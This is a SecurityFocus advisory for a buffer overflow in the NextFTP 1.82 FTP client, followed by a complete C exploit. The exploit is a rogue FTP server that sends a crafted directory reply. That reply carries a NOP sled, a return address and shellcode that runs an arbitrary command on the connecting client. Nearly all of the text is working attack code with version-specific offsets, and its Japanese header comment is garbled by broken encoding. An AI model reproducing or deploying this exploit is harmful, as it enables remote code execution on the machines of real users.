source: http://www.securityfocus.com/bid/572/info


ToxSoft's shareware FTP client, NextFTP, contains an unchecked buffer in the code that parses CWD command replies. If the FTP server's reply contains the exploit code, arbitrary commands can be run on the client machine. 

/*=============================================================================
   Next FTP Exploit Server Rev.2
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (unewn4th@usa.net)

   [��]
   NextFTP Ver1.82 �CWD�I[o[t[oO� �ܵ�BFTPT[o�
   �exploit code�M������ANCAg�ε�C����s
   ���ƪūܷB��Tv�UNIXŮ�AC��[U�ApX
   [h��Aexploit_code�M��gCŷB��Tv��A
   exploit_code�ANCAg��C��R}h��s�s���ŷ�A
   exploit_code�g֦�����C��t@C�AECX�����
   �\ŷ(֥R[h: 00H, 22H, FFH)B
   [��mF]
   ET[o         TurboLinux3.0 (���UNIX��)
   ENCAg   Windows98
   EFTP            NextFTP Ver1.82
   [T[o��]
   W�ftpd��~�ܷB���ARpC���s���OKŷB
   (RpC�:gcc ex_nextftp.c -lsocket)
   ܽA^[QbgNCAg�Windows C Runtime Library�o[W�
   ���A\[X
   #define DLL_VER_PSYSTEM     V5_00_7022_SYSTEM           
   #define DLL_VER_PEXIT       V5_00_7022_EXIT
   �s��X�ľ��Bo[W�A
   c:\windows\system\msvcrt.dll
   �ENbNAvpeB�mFūܷB
   ܽAfBtHg��notepad.exe�N��Ģܷ�A
   #define EXPCMD              "notepad.exe"
   �s��X���AC��R}h��s���ƪūܷB

  � FFFFTP Ver1.66��l�ZLeBz[� �ܷB
     ��exploit�gpūܹ�AJumpingAddress��XŮ���v�ܷB
  =============================================================================
*/
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <limits.h>
#include <netdb.h>
#include <arpa/inet.h>

#define V5_00_7128_SYSTEM       0xc1a0
#define V5_00_7128_EXIT         0x8bb0
#define V5_00_7022_SYSTEM       0x888d
#define V5_00_7022_EXIT         0x39ef
#define V6_00_8168_0_SYSTEM     0x888d
#define V6_00_8168_0_EXIT       0x39ef
#define V6_00_8397_0_SYSTEM     0x9824
#define V6_00_8397_0_EXIT       0x5504

#define BANNER              "ftp.trojan.ac.jp FTP server ready."
#define EXPCMD              "notepad.exe"
#define DLL_VER_PSYSTEM     V5_00_7022_SYSTEM           
#define DLL_VER_PEXIT       V5_00_7022_EXIT

int     get_connection(socket_type, port, listener)
int     socket_type;
int     port;
int     *listener;
{
        struct sockaddr_in      address;
        struct sockaddr_in      acc;
        int                     listening_socket;
        int                     connected_socket = -1;
        int                     new_process;
        int                     reuse_addr = 1;
        int                     acclen=sizeof(acc);

        memset((char *) &address, 0, sizeof(address));
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        address.sin_addr.s_addr = htonl(INADDR_ANY);
        listening_socket = socket(AF_INET, socket_type, 0);
        if (listening_socket < 0) {
        perror("socket");
        exit(1);
        }
        if (listener != NULL) *listener = listening_socket;
        setsockopt(listening_socket,SOL_SOCKET,SO_REUSEADDR,
                    &reuse_addr,sizeof(reuse_addr));
        if (bind(listening_socket,(struct sockaddr *)&address,
                    sizeof(address)) < 0) {
        perror("bind");
        close(listening_socket);
        exit(1);
        }
        if (socket_type == SOCK_STREAM){
                listen(listening_socket, 5);
                while(connected_socket < 0){
                        connected_socket=accept(listening_socket,&acc,&acclen);
                        if (connected_socket < 0){
                                if (errno != EINTR){
                                        perror("accept");
                                        close(listening_socket);
                                        exit(1);
                                }else continue;
                        }
                        new_process=fork();
                        if (new_process<0){
                                perror("fork");
                                close(connected_socket);
                                connected_socket = -1;
                        }else{
                                if (new_process == 0) {
                                        close(listening_socket);
                                        if (listener!=NULL) *listener = -1;
                                }else{
                                        close(connected_socket);
                                        connected_socket = -1;
                                }
                        }
                }
                return connected_socket;
  }else return listening_socket;
}

int     sock_write(sockfd, buf, count)
int     sockfd;
char    *buf;
size_t  count;
{
        size_t  bytes_sent = 0;
        int     this_write;

        while (bytes_sent < count) {
                do
                        this_write = write(sockfd, buf, count - bytes_sent);
                while ( (this_write < 0) && (errno == EINTR) );
                if (this_write <= 0)
                        return this_write;
                bytes_sent += this_write;
                buf += this_write;
        }
        return count;
}

int     sock_gets(sockfd, str, count)
int     sockfd;
char    *str;
size_t  count;
{
        int             bytes_read;
        int             total_count = 0;
        char    *current_position;
        char    last_read = 0;

        current_position = str;
        while (last_read != 10) {
                bytes_read = read(sockfd, &last_read, 1);
                if (bytes_read <= 0) return -1;
                if ( (total_count < count)
                && (last_read !=0)
                && (last_read != 10)
                && (last_read !=13) ) {
                        current_position[0] = last_read;
                        current_position++;
                        total_count++;
                }
        }
        if (count > 0)
                current_position[0] = 0;
        return total_count;
}

char exploit_code[200]={
0xb4,0x20,0xb4,0x21,0x8b,0xcc,0x83,0xe9,
0x04,0x8b,0x19,0x33,0xc9,0x66,0xb9,0x10,
0x10,0x80,0x3b,0xb4,0x75,0x12,0x80,0x7b,
0x01,0x20,0x75,0x0c,0x80,0x7b,0x02,0xb4,
0x75,0x06,0x80,0x7b,0x03,0x21,0x74,0x03,
0x43,0xe2,0xe6,0x33,0xc0,0xb0,0x31,0x03,
0xd8,0xb4,0xfe,0x80,0xc4,0x01,0x88,0x63,
0x3b,0x88,0x63,0x3c,0x88,0x63,0x3d,0x88,
0x63,0x24,0x88,0x63,0x36,0xeb,0x23,0x5b,
0x53,0x32,0xe4,0x83,0xc3,0x0c,0x88,0x23,
0xb8,0x8d,0x88,0x01,0x78,0xee,0xd0,0x33,
0xc0,0x50,0xb4,0x78,0xc1,0xe0,0x10,0x33,
0xdb,0x66,0xbb,0xef,0x39,0x0b,0xc3,0xee,
0xd0,0x90,0xe8,0xd8,0x90,0x90,0x90,0x00};

int     main(argc, argv)
int     argc;
char    *argv[];
{
        int             sock,listensock;  
        char            buffer[1024]; 
        char            name[1024];
        char            code[1000];
        static          char xxx[20000];
        static          char xx2[20000];
        unsigned int    i,k,ip;
        int             ver_system,ver_exit;

        sock = get_connection(SOCK_STREAM, 21, &listensock);

        /* Banner send */
        memset(xxx,41,10000);
        xxx[10000]=0;
        sprintf(xx2,"220 %s \x0d\x0a",BANNER);
        sock_write(sock,xx2,strlen(xx2));

        /* User ident */
        sock_gets(sock,buffer,1024);
        strcpy(name,buffer+5);
        sprintf(buffer,"331 Password required for %s.\x0d\x0a",name);
        sock_write(sock,buffer,strlen(buffer));
        sock_gets(sock,buffer,1024);
        sprintf(buffer,"230 User %s logged in.\x0d\x0a",name);
        sock_write(sock,buffer,strlen(buffer));

        /* get PWD */
        sock_gets(sock,buffer,1024);
    
        /* EXPLOT */
        ver_system=DLL_VER_PSYSTEM;
        ver_exit=DLL_VER_PEXIT;

        memset(xxx,0x90,10000);
        k=512;
        if (ver_system==V6_00_8397_0_SYSTEM)
            ip=0x006bcb8c+300;
        else
            ip=0x006bce50+300;

        xxx[k+3]=(ip>>24)&0xff;
        xxx[k+2]=(ip>>16)&0xff;
        xxx[k+1]=(ip>>8)&0xff;
        xxx[k]=ip&0xff;

        strcpy(code,exploit_code);
        code[0x4d]=strlen(EXPCMD);
        strcpy(code+strlen(code),EXPCMD);

        code[81]=ver_system&0xff;
        code[82]=(ver_system>>8)&0xff;
        code[99]=ver_exit&0xff;
        code[100]=(ver_exit>>8)&0xff;
        for (i=0;i<strlen(code);i++)
            xxx[i+350]=code[i];

        xxx[1024]=0;
        sprintf(xx2,"257 \"%s\" is current directory.\x0d\x0a",xxx);
        sock_write(sock,xx2,strlen(xx2));
        sock_gets(sock,buffer,1024);
}